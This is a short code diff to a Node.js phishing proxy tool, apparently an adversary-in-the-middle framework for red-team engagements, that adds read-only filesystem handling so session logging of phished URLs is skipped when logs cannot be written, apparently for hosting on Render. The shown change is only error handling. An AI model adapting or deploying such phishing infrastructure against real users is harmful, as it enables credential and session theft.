@@ -29,12 +29,16 @@ const PROXY_PATHNAMES = {
 };
 
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
+// Render filesystem may be read-only, handle gracefully
+let LOGGING_ENABLED = false;
 try {
     if (!fs.existsSync(LOGS_DIRECTORY)) {
         fs.mkdirSync(LOGS_DIRECTORY);
     }
+    LOGGING_ENABLED = true;
 } catch (error) {
-    displayError("Directory creation failed", error, LOGS_DIRECTORY);
+    console.log("Logging disabled - filesystem not writable:", error.message);
+    LOGGING_ENABLED = false;
 }
 const LOG_FILE_STREAMS = {};
 //!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
@@ -626,10 +630,18 @@ function generateRandomString(length) {
 }
 
 function createSessionLogFile(logFilename, currentSession) {
-    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
-    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
-
-    LOG_FILE_STREAMS[currentSession] = logFileStream;
+    if (!LOGGING_ENABLED) {
+        console.log("Logging disabled - skipping log file creation");
+        return;
+    }
+    
+    try {
+        const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
+        const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
+        LOG_FILE_STREAMS[currentSession] = logFileStream;
+    } catch (error) {
+        console.log("Failed to create log file:", error.message);
+    }
 }
 
 function generateNewSession(phishedURL) {
